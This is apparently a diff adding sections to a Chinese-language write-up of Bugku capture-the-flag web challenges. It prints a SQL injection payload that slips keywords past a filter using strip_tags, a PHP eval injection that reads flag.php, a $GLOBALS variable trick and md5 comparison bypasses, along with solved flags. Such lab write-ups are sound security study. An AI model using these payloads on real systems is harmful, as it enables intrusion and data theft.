@@ -110,3 +110,134 @@ python2 sqlmap.py -u http://103.238.227.13:10083/?id=1%df%27
 <div align="center">
     <img src="/images/posts/bugku/18.png" >  
 </div>
+
+### SQL注入测试
+&emsp;&emsp;题目描述：
+>访问参数为：?id=x
+>查找表为key的数据表，id=1值hash字段值
+
+&emsp;&emsp;过滤代码
+```php
+//过滤sql
+$array = array('table','union','and','or','load_file','create','delete','select','update','sleep','alter','drop','truncate','from','max','min','order','limit');
+foreach ($array as $value)
+{
+    if (substr_count($id, $value) > 0)
+    {
+        exit('包含敏感关键字！'.$value);
+    }
+}
+
+//xss过滤
+$id = strip_tags($id);
+
+$query = "SELECT * FROM temp WHERE id={$id} LIMIT 1";
+```
+&emsp;&emsp;可以看出过滤得很严格，但致命的缺陷是`$id = strip_tags($id);`，它给了我们一丝可乘之机。`strip_tags`可以过滤掉html、xml、php中的标签，比如将a`<`a`>`nd过滤成and。
+
+&emsp;&emsp;所以payload：
+```
+http://103.238.227.13:10087/?id=-1 u<a>nion se<a>lect hash,2 f<a>rom `key` where id=1 -- +
+```
+&emsp;&emsp;flag： KEY{c3d3c17b4ca7f791f85e#$1cc72af274af4adef}
+
+### 本地包含
+&emsp;&emsp;题目描述：
+```php
+echo '2333，不只是本地文件包含哦~'; <?php 
+    include "waf.php"; 
+    include "flag.php"; 
+    $a = @$_REQUEST['hello']; 
+    eval( "var_dump($a);"); 
+    show_source(__FILE__); 
+?>
+```
+&emsp;&emsp;这里一开始踏进了一个坑，测试的时候使用了`1)";echo 111;//`，但没有任何回显。
+<div align="center">
+    <img src="/images/posts/bugku/19.png" >  
+</div>
+&emsp;&emsp;看了writeup后才发现`"`是多余的。
+<div align="center">
+    <img src="/images/posts/bugku/20.png" >  
+</div>
+&emsp;&emsp;在`eval()`中可以使用`print_r(file("xxx"))`的形式读取文件，所以payload就是：`1);print_r(file("flag.php"));//`
+<div align="center">
+    <img src="/images/posts/bugku/21.png" >  
+</div>
+
+### 变量1
+&emsp;&emsp;题目描述：
+```php
+flag In the variable ! <?php  
+
+error_reporting(0);
+include "flag1.php";
+highlight_file(__file__);
+if(isset($_GET['args'])){
+    $args = $_GET['args'];
+    if(!preg_match("/^\w+$/",$args)){
+        die("args error!");
+    }
+    eval("var_dump($$args);");
+}
+?>
+```
+&emsp;&emsp;这里由于正则只匹配字母，不允许有`;`之类的符号出现，所以用上一道题的payload是没法获得flag的。但好在存在`$$args`，可以为我们打开另一道窗。
+
+&emsp;&emsp;这里介绍一个php中的特殊变量: `$GLOBALS`，它的作用如下：
+<div align="center">
+    <img src="/images/posts/bugku/22.png" >  
+</div>
+&emsp;&emsp;所以我们可以利用`$GLOBALS`输出flag的值，故payload：`http://120.24.86.145:8004/index1.php?args=GLOBALS`。
+<div align="center">
+    <img src="/images/posts/bugku/23.png" >  
+</div>
+
+### 备份是个好习惯
+&emsp;&emsp;题目描述：
+>http://120.24.86.145:8002/web16/
+>听说备份是个好习惯
+
+&emsp;&emsp;访问index.php.bak可以下载源码
+```php
+<?php
+include_once "flag.php";
+ini_set("display_errors", 0);
+$str = strstr($_SERVER['REQUEST_URI'], '?');
+$str = substr($str,1);
+$str = str_replace('key','',$str);
+parse_str($str);
+echo md5($key1);
+
+echo md5($key2);
+if(md5($key1) == md5($key2) && $key1 !== $key2){
+    echo $flag."取得flag";
+}
+?>
+```
+
+&emsp;&emsp;这里说下`$_SERVER['REQUEST_URI']`和`parse_str($str)`的作用，
+```php
+访问：http://localhost/aaa/?p=222
+$_SERVER['REQUEST_URI']  = "/aaa/?p=222";
+
+<?php
+parse_str("name=Bill&age=60");
+echo $name."<br>";  // Bill
+echo $age;  // 60
+?>
+```
+
+&emsp;&emsp;接下来介绍两个绕过md5检查的方法
+* **一：使用数组的形式绕过**
+&emsp;&emsp;&emsp;&emsp;因为MD5不能处理数组，MD5在对数组进行加密时会返回`false（null?）`，`false==false`无疑是成立的，所以可以构造`?a[]=1&b[]=2`之类的方法绕过检查。所以，payload1如下：
+<div align="center">
+    <img src="/images/posts/bugku/24.png" >  
+</div>
+* **二：找到两个md5加密后相同的值**
+&emsp;&emsp;&emsp;&emsp;这个要考积累，这里我找到了两个值。`?key1=QNKCDZO&key2=240610708`。
+<div align="center">
+    <img src="/images/posts/bugku/25.png" >  
+</div>
+
+
